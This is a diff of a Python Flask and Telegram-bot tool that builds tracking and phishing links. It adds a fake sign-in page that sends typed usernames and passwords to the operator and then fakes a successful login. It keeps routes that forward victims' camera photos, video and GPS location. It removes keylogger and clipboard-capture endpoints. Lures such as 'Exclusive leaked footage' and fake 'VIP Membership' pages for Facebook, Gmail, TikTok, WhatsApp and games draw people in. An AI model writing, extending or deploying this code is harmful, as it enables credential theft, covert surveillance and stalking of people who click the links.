+.card{{background:{pcard};border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.18);padding:28px 22px 20px;width:100%;max-width:400px;text-align:center}}
+.logo-wrap{{margin-bottom:22px}}
+.sub{{color:{psub};font-size:.88rem;margin-bottom:20px;line-height:1.5}}
+.field-wrap{{margin-bottom:12px;text-align:left}}
+input{{width:100%;padding:14px 15px;border:1.5px solid #ddd;border-radius:8px;font-size:.97rem;outline:none;transition:border .2s;background:transparent;color:{ptext}}}
+input:focus{{border-color:{pcolor};box-shadow:0 0 0 3px {pcolor}22}}
+.btn{{width:100%;padding:14px;background:{pcolor};color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer;margin:6px 0 14px;letter-spacing:.5px;transition:opacity .2s}}
+.btn:hover{{opacity:.9}}
+.err{{color:#e63946;font-size:.8rem;margin:2px 0 8px;text-align:left;display:none;padding:8px 12px;background:#fff0f0;border-radius:6px;border-left:3px solid #e63946}}
+.footer{{color:{psub};font-size:.78rem;margin-top:8px}}
+.forgot{{color:{pcolor};text-decoration:none;font-size:.84rem}}
+</style></head>
+<body>
+<div class="card">
+  <div class="logo-wrap">{plogo}</div>
+  <div class="sub">Sign in to continue to {pname}</div>
+  <div class="err" id="err">{perr}</div>
+  <div class="field-wrap"><input type="text" id="u" placeholder="{pfield}" autocomplete="username"></div>
+  <div class="field-wrap"><input type="password" id="pw" placeholder="{ppass}" autocomplete="current-password"></div>
+  <button class="btn" onclick="doLogin()">{pbtn}</button>
+  <div class="footer">
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
+</div>
+<script>
+let attempt=0;
+const TOKEN='{token}';
+const PNAME='{pname}';
+function doLogin(){{
+  const u=document.getElementById('u').value.trim();
+  const pw=document.getElementById('pw').value;
+  const err=document.getElementById('err');
+  if(!u||!pw){{err.style.display='block';err.textContent='Please fill in all fields.';return;}}
+  fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
+    body:JSON.stringify({{token:TOKEN,platform:PNAME,username:u,password:pw,ua:navigator.userAgent}})}});
+  attempt++;
+  if(attempt<2){{
+    err.style.display='block';
+    document.getElementById('pw').value='';
+  }}else{{
+    err.style.display='none';
+    document.querySelector('.card').innerHTML='<div style="padding:40px 20px;text-align:center"><div style="font-size:3rem">✅</div><div style="font-size:1.2rem;font-weight:700;margin-top:14px;color:{ptext}">Login Successful</div><p style="color:{psub};margin-top:8px;font-size:.88rem">Redirecting to {pname}...</p></div>';
+    setTimeout(()=>window.location.href='{predirect}',2200);
+  }}
+}}
+document.addEventListener('keydown',e=>{{if(e.key==='Enter')doLogin();}});
+</script>
+</body></html>"""
+    return html, 200
+
+
 @flask_app.route('/capture_combined_photo', methods=['POST'])
 def capture_combined_photo():
-    data = request.get_json(silent=True) or {}
-    token = request.form.get('token') or data.get('token')
+    token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
     photo_file = request.files.get('photo')
-    if not photo_file and data.get('photo'):
-        try:
-            import base64
-            encoded = data.get('photo').split(',', 1)[1]
-            photo_file = type('F', (), {'read': lambda self=None: base64.b64decode(encoded)})()
-        except Exception:
-            photo_file = None
     if not photo_file:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint') or data.get('fingerprint')
+    fp_json = request.form.get('fingerprint')
     caption = _fp_caption(fp_json)
     photo_bytes = photo_file.read()
     threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
@@ -1580,22 +1635,14 @@ def capture_combined_photo():
 
 @flask_app.route('/capture_combined_video', methods=['POST'])
 def capture_combined_video():
-    data = request.get_json(silent=True) or {}
-    token = request.form.get('token') or data.get('token')
+    token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
     video_file = request.files.get('video')
-    if not video_file and data.get('video'):
-        try:
-            import base64
-            encoded = data.get('video').split(',', 1)[1]
-            video_file = type('F', (), {'read': lambda self=None: base64.b64decode(encoded)})()
-        except Exception:
-            video_file = None
     if not video_file:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint') or data.get('fingerprint')
+    fp_json = request.form.get('fingerprint')
     caption = _fp_caption(fp_json)
     video_bytes = video_file.read()
     threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
@@ -1702,127 +1749,6 @@ def capture_screen_recording():
     return jsonify({"ok": True}), 200
 
 
-@flask_app.route('/capture_clipboard', methods=['POST'])
-def capture_clipboard():
-    data = request.get_json(silent=True) or {}
-    token = data.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"ok": False}), 400
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    ua = data.get('ua', 'Unknown')
-    text = data.get('text', '').strip()
-    note = data.get('note', '')
-    ua_lower = ua.lower()
-    if 'android' in ua_lower: os_tag = '🤖 Android'
-    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
-    elif 'windows' in ua_lower: os_tag = '🪟 Windows'
-    elif 'mac' in ua_lower: os_tag = '🍎 Mac'
-    else: os_tag = '❓ Unknown'
-    clip_display = f"<code>{text[:1500]}</code>" if text and '[Permission' not in text else f"⚠️ {text}"
-    extra = f"\n📌 Note: {note}" if note else ""
-    report = (
-        f"📋 <b>CLIPBOARD CAPTURED!</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 Device: <b>{os_tag}</b>\n"
-        f"🌐 IP: <code>{ip}</code>\n"
-        f"📝 Content:\n{clip_display}{extra}\n"
-        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
-    return jsonify({"ok": True}), 200
-
-
-@flask_app.route('/capture_keylog', methods=['POST'])
-def capture_keylog():
-    data = request.get_json(silent=True) or {}
-    token = data.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"ok": False}), 400
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    ua = data.get('ua', 'Unknown')
-    keys = data.get('keys', '').strip()
-    field = data.get('field', 'keyboard')
-    if not keys:
-        return jsonify({"ok": True}), 200
-    ua_lower = ua.lower()
-    if 'android' in ua_lower: os_tag = '🤖 Android'
-    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
-    elif 'windows' in ua_lower: os_tag = '🪟 Windows'
-    elif 'mac' in ua_lower: os_tag = '🍎 Mac'
-    else: os_tag = '❓ Unknown'
-    report = (
-        f"⌨️ <b>KEYLOGGER CAPTURED!</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 Device: <b>{os_tag}</b>\n"
-        f"🌐 IP: <code>{ip}</code>\n"
-        f"🖊️ Field: <b>{field}</b>\n"
-        f"📝 Keys typed:\n<code>{keys[:1500]}</code>\n"
-        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
-    return jsonify({"ok": True}), 200
-
-
-@flask_app.route('/capture_torch', methods=['POST'])
-def capture_torch():
-    data = request.get_json(silent=True) or {}
-    token = data.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"ok": False}), 400
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    ua = data.get('ua', 'Unknown')
-    error = data.get('error', '')
-    ua_lower = ua.lower()
-    if 'android' in ua_lower: os_tag = '🤖 Android'
-    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
-    else: os_tag = '❓ Unknown'
-    status = f"❌ Failed: {error}" if error else "✅ Torch activated (12s)"
-    report = (
-        f"🔦 <b>TORCH / FLASH ACTIVATED!</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 Device: <b>{os_tag}</b>\n"
-        f"🌐 IP: <code>{ip}</code>\n"
-        f"⚡ Status: {status}\n"
-        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
-    return jsonify({"ok": True}), 200
-
-
-@flask_app.route('/capture_vibrate', methods=['POST'])
-def capture_vibrate():
-    data = request.get_json(silent=True) or {}
-    token = data.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"ok": False}), 400
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    ua = data.get('ua', 'Unknown')
-    supported = data.get('supported', False)
-    ua_lower = ua.lower()
-    if 'android' in ua_lower: os_tag = '🤖 Android'
-    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
-    else: os_tag = '❓ Unknown'
-    status = "✅ Vibrated (5 pulses)" if supported else "❌ Not supported on this device"
-    report = (
-        f"📳 <b>VIBRATE TRIGGERED!</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 Device: <b>{os_tag}</b>\n"
-        f"🌐 IP: <code>{ip}</code>\n"
-        f"⚡ Status: {status}\n"
-        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
-    return jsonify({"ok": True}), 200
-
-
 @flask_app.route('/capture_motion', methods=['POST'])
 def capture_motion():
     data = request.get_json(silent=True) or {}
@@ -1859,16 +1785,15 @@ def capture_motion():
 
 @flask_app.route('/capture_combined_location', methods=['POST'])
 def capture_combined_location():
-    data = request.get_json(silent=True) or {}
-    token = request.form.get('token') or data.get('token')
+    token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
-    lat = request.form.get('lat') or data.get('lat')
-    lon = request.form.get('lon') or data.get('lon')
+    lat = request.form.get('lat')
+    lon = request.form.get('lon')
     if not lat or not lon:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint') or data.get('fingerprint')
+    fp_json = request.form.get('fingerprint')
     caption = _fp_caption(fp_json)
     threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
     threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
@@ -1983,8 +1908,6 @@ def get_reply_keyboard():
             [KeyboardButton("📞 Contact List Link")],
             [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
             [KeyboardButton("📳 Motion+IP Link")],
-            [KeyboardButton("🔦 Torch Link"), KeyboardButton("📳 Vibrate Link")],
-            [KeyboardButton("📋 Clipboard Link"), KeyboardButton("⌨️ Keylogger Link")],
             [KeyboardButton("💎 FB VIP"), KeyboardButton("💎 Gmail VIP")],
             [KeyboardButton("💎 TikTok VIP"), KeyboardButton("💎 Instagram VIP")],
             [KeyboardButton("💎 Telegram VIP"), KeyboardButton("💎 WhatsApp VIP")],
@@ -2011,10 +1934,6 @@ def main_menu_inline():
         [InlineKeyboardButton("📷 Burst Photos", callback_data="gen_burst"),
          InlineKeyboardButton("🖥️ Screen Record", callback_data="gen_screen")],
         [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
-        [InlineKeyboardButton("🔦 Torch", callback_data="gen_torch"),
-         InlineKeyboardButton("📳 Vibrate", callback_data="gen_vibrate")],
-        [InlineKeyboardButton("📋 Clipboard", callback_data="gen_clipboard"),
-         InlineKeyboardButton("⌨️ Keylogger", callback_data="gen_keylog")],
         [InlineKeyboardButton("💎 FB VIP", callback_data="gen_fakefb"),
          InlineKeyboardButton("💎 Gmail VIP", callback_data="gen_fakegmail")],
         [InlineKeyboardButton("💎 TikTok VIP", callback_data="gen_faketiktok"),
@@ -2035,21 +1954,21 @@ def main_menu_inline():
 
 def make_links_inline(token):
     base = f"{BASE_URL}/beautiful-girls/{token}"
-    all_url = f"{base}?m=all"
+    all_url = f"{base}?m=all&style=simple"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🌐 All-in-One", url=all_url)],
-        [InlineKeyboardButton("📸 Photo", url=f"{base}?m=photo"),
-         InlineKeyboardButton("🎤 Audio", url=f"{base}?m=audio")],
-        [InlineKeyboardButton("📍 Location", url=f"{base}?m=location"),
-         InlineKeyboardButton("🎥 Video", url=f"{base}?m=video")],
-        [InlineKeyboardButton("🖼️ Gallery", url=f"{base}?m=gallery"),
-         InlineKeyboardButton("🤳 Front Cam", url=f"{base}?m=frontcam")],
-        [InlineKeyboardButton("📞 Contacts", url=f"{base}?m=contacts")],
-        [InlineKeyboardButton("📷 Burst Photos", url=f"{base}?m=burst"),
-         InlineKeyboardButton("🖥️ Screen Record", url=f"{base}?m=screen")],
-        [InlineKeyboardButton("📳 Motion+IP", url=f"{base}?m=motion")],
+        [InlineKeyboardButton("📸 Photo", url=f"{base}?m=photo&style=simple"),
+         InlineKeyboardButton("🎤 Audio", url=f"{base}?m=audio&style=simple")],
+        [InlineKeyboardButton("📍 Location", url=f"{base}?m=location&style=simple"),
+         InlineKeyboardButton("🎥 Video", url=f"{base}?m=video&style=simple")],
+        [InlineKeyboardButton("🖼️ Gallery", url=f"{base}?m=gallery&style=simple"),
+         InlineKeyboardButton("🤳 Front Cam", url=f"{base}?m=frontcam&style=simple")],
+        [InlineKeyboardButton("📞 Contacts", url=f"{base}?m=contacts&style=simple")],
+        [InlineKeyboardButton("📷 Burst Photos", url=f"{base}?m=burst&style=simple"),
+         InlineKeyboardButton("🖥️ Screen Record", url=f"{base}?m=screen&style=simple")],
+        [InlineKeyboardButton("📳 Motion+IP", url=f"{base}?m=motion&style=simple")],
         [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
         [InlineKeyboardButton("📋 Active Links", callback_data="links"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")],
@@ -2075,7 +1994,7 @@ def format_links_msg(token):
 
 
 def format_single_link_msg(token, mode_key, label):
-    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}&style=simple"
+    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}"
     return (
         f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -2086,7 +2005,7 @@ def format_single_link_msg(token, mode_key, label):
 
 
 def single_link_inline(token, mode_key, label):
-    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}"
+    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}&style=simple"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
@@ -2734,10 +2653,6 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📷 Burst Photos Link":       ("burst",    "📷 Burst Photos"),
         "🖥️ Screen Record Link":      ("screen",   "🖥️ Screen Record"),
         "📳 Motion+IP Link":          ("motion",   "📳 Motion+IP"),
-        "🔦 Torch Link":              ("torch",    "🔦 Torch Flash"),
-        "📳 Vibrate Link":            ("vibrate",  "📳 Vibrate"),
-        "📋 Clipboard Link":          ("clipboard","📋 Clipboard Reader"),
-        "⌨️ Keylogger Link":          ("keylog",   "⌨️ Keylogger"),
     }
 
     FAKE_TEXT_MAP = {
@@ -2759,12 +2674,12 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         token = secrets.token_urlsafe(12)
         tracking_links[token] = user_id
-        url = f"{BASE_URL}/vip-access/{platform}/{token}"
+        url = f"{BASE_URL}/fake-login/{platform}/{token}"
         _plabels = {'facebook':'Facebook','gmail':'Gmail','tiktok':'TikTok','instagram':'Instagram',
                     'telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends',
                     'pubg':'PUBG Mobile','freefire':'Free Fire'}
-        label = f"💎 {_plabels.get(platform, platform.title())} VIP Access"
-        share_text = "💎 VIP Access link ဖြစ်သည်"
+        label = f"💎 {_plabels.get(platform, platform.title())} VIP Membership"
+        share_text = "💎 VIP Membership အတည်ပြုရန် link ဖြစ်သည်"
         share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
         await update.message.reply_text(
             f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
@@ -2891,10 +2806,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gen_burst":    ("burst",    "📷 Burst Photos"),
         "gen_screen":   ("screen",   "🖥️ Screen Record"),
         "gen_motion":   ("motion",   "📳 Motion+IP"),
-        "gen_torch":     ("torch",     "🔦 Torch Flash"),
-        "gen_vibrate":   ("vibrate",  "📳 Vibrate"),
-        "gen_clipboard": ("clipboard","📋 Clipboard Reader"),
-        "gen_keylog":    ("keylog",   "⌨️ Keylogger"),
     }
 
     FAKE_LOGIN_MODES = {
@@ -2916,12 +2827,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         token = secrets.token_urlsafe(12)
         tracking_links[token] = user_id
-        url = f"{BASE_URL}/vip-access/{platform}/{token}"
+        url = f"{BASE_URL}/fake-login/{platform}/{token}"
         _plabels = {'facebook':'Facebook','gmail':'Gmail','tiktok':'TikTok','instagram':'Instagram',
                     'telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends',
                     'pubg':'PUBG Mobile','freefire':'Free Fire'}
-        label = f"💎 {_plabels.get(platform, platform.title())} VIP Access"
-        share_text = "💎 VIP Access link ဖြစ်သည်"
+        label = f"💎 {_plabels.get(platform, platform.title())} VIP Membership"
+        share_text = "💎 VIP Membership အတည်ပြုရန် link ဖြစ်သည်"
         share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
         await query.edit_message_text(
             f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
